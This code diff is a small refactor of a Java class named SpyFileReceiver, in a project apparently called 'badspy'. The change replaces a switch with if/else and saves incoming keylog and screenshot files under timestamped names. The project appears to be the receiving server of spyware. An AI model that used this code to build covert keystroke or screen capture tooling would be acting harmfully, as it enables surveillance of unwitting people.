@@ -2,8 +2,8 @@ package com.blogspot.sontx.badspy.badserver.bo.spyworker;
 
 import com.blogspot.sontx.badspy.badserver.Config;
 import com.blogspot.sontx.badspy.badserver.Convert;
-import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
 import com.blogspot.sontx.badspy.badserver.bo.Receiver;
+import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
 import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
 import com.blogspot.sontx.jlog.Log;
 
@@ -51,15 +51,12 @@ public class SpyFileReceiver extends Receiver implements Closeable {
         String sMagic = new String(magic, 0, magic.length);
         String fileName = null;
         Log.d(String.format("File: magic = %s, seconds = %d", sMagic, createdDateTime));
-        switch (sMagic) {
-            case Config.STORAGE_MAGIC_KBFILE:
-                fileName = String.format("%s%s", Config.STORAGE_PREFIX_KBFILE, Convert.integerToDateTime(createdDateTime));
-                break;
-            case Config.STORAGE_MAGIC_SCROTFILE:
-                fileName = String.format("%s%s", Config.STORAGE_PREFIX_SCROTFILE, Convert.integerToDateTime(createdDateTime));
-                break;
-            default:
-                throw new InvalidParameterException("Magic is invalid");
+        if (sMagic.equals(Config.STORAGE_MAGIC_KBFILE)) {
+            fileName = String.format("%s%s", Config.STORAGE_PREFIX_KBFILE, Convert.integerToDateTime(createdDateTime));
+        } else if (sMagic.equals(Config.STORAGE_MAGIC_SCROTFILE)) {
+            fileName = String.format("%s%s", Config.STORAGE_PREFIX_SCROTFILE, Convert.integerToDateTime(createdDateTime));
+        } else {
+            throw new InvalidParameterException("Magic is invalid");
         }
         out = new FileOutputStream(new File(saveDir.getPath(), fileName));
     }
